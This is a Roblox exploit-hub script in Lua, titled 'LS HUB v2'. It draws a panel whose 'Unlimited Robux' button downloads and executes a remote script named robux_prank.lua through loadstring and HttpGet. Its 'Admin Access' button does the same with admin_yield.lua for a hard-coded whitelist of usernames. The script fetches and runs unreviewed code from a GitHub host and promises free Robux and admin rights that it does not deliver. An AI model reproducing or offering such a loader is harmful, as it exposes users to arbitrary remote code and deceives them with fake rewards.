local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Subtitle = Instance.new("TextLabel")
local RobuxButton = Instance.new("TextButton")
local AdminButton = Instance.new("TextButton")
local Status = Instance.new("TextLabel")
local Stroke = Instance.new("UIStroke")

ScreenGui.Parent = game:GetService("CoreGui")

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0,340,0,220)
Frame.Position = UDim2.new(0.5,-170,0.5,-110)
Frame.BackgroundColor3 = Color3.fromRGB(15,15,20)
Frame.Active = true
Frame.Draggable = true

Instance.new("UICorner", Frame)

Stroke.Parent = Frame
Stroke.Color = Color3.fromRGB(0,170,255)
Stroke.Thickness = 2

Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,35)
Title.BackgroundTransparency = 1
Title.Text = "LS HUB v2"
Title.TextColor3 = Color3.fromRGB(0,170,255)
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true

Subtitle.Parent = Frame
Subtitle.Size = UDim2.new(1,0,0,20)
Subtitle.Position = UDim2.new(0,0,0,32)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Premium Utility Panel"
Subtitle.TextColor3 = Color3.fromRGB(180,180,180)
Subtitle.Font = Enum.Font.Gotham
Subtitle.TextScaled = true

RobuxButton.Parent = Frame
RobuxButton.Size = UDim2.new(0.8,0,0,45)
RobuxButton.Position = UDim2.new(0.1,0,0.32,0)
RobuxButton.Text = "💰 Unlimited Robux"
RobuxButton.Font = Enum.Font.GothamBold
RobuxButton.TextScaled = true
RobuxButton.BackgroundColor3 = Color3.fromRGB(0,170,255)
RobuxButton.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", RobuxButton)

AdminButton.Parent = Frame
AdminButton.Size = UDim2.new(0.8,0,0,45)
AdminButton.Position = UDim2.new(0.1,0,0.58,0)
AdminButton.Text = "👑 Admin Access"
AdminButton.Font = Enum.Font.GothamBold
AdminButton.TextScaled = true
AdminButton.BackgroundColor3 = Color3.fromRGB(0,200,120)
AdminButton.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", AdminButton)

Status.Parent = Frame
Status.Size = UDim2.new(1,-10,0,20)
Status.Position = UDim2.new(0,5,1,-25)
Status.BackgroundTransparency = 1
Status.Text = "Status: Ready"
Status.TextColor3 = Color3.fromRGB(200,200,200)
Status.Font = Enum.Font.Gotham
Status.TextScaled = true

-- ROBUX LOADER HANDLER (Runs instantly for everyone!)
RobuxButton.MouseButton1Click:Connect(function()
	Status.Text = "Status: Launching Robux Scanner..."
	task.wait(0.5)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LSgaming-youtuber/LS-Hub-V2-Main-Menu/main/robux_prank.lua"))()
end)

-- LS ADMIN YIELD V5 LOADER HANDLER (Whitelisted Users Only)
AdminButton.MouseButton1Click:Connect(function()
	local username = game.Players.LocalPlayer.Name

	Status.Text = "Scanning User..."
	task.wait(1)

	Status.Text = "Found User: "..username
	task.wait(1)

	Status.Text = "Checking Permissions..."
	task.wait(1)

	-- Main Owner (You)
	if username == "LSgaming20242" then
		Status.Text = "👑 OWNER DETECTED ✅ - ACCESS GRANTED"
		task.wait(0.5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LSgaming-youtuber/LS-Hub-V2-Main-Menu/main/admin_yield.lua"))()

	-- Premium Friend 1
	elseif username == "T34vg9580" then
		Status.Text = "👑 PREMIUM USER DETECTED ✅ - ACCESS GRANTED"
		task.wait(0.5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LSgaming-youtuber/LS-Hub-V2-Main-Menu/main/admin_yield.lua"))()

	-- Premium Friend 2
	elseif username == "Lolfdjdvg" then
		Status.Text = "👑 PREMIUM USER DETECTED ✅ - ACCESS GRANTED"
		task.wait(0.5)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LSgaming-youtuber/LS-Hub-V2-Main-Menu/main/admin_yield.lua"))()

	else
		Status.Text = "❌ ACCESS DENIED"
		task.wait(2)
		Status.Text = "💰 Try Unlimited Robux Instead 🤣"
	end
end)
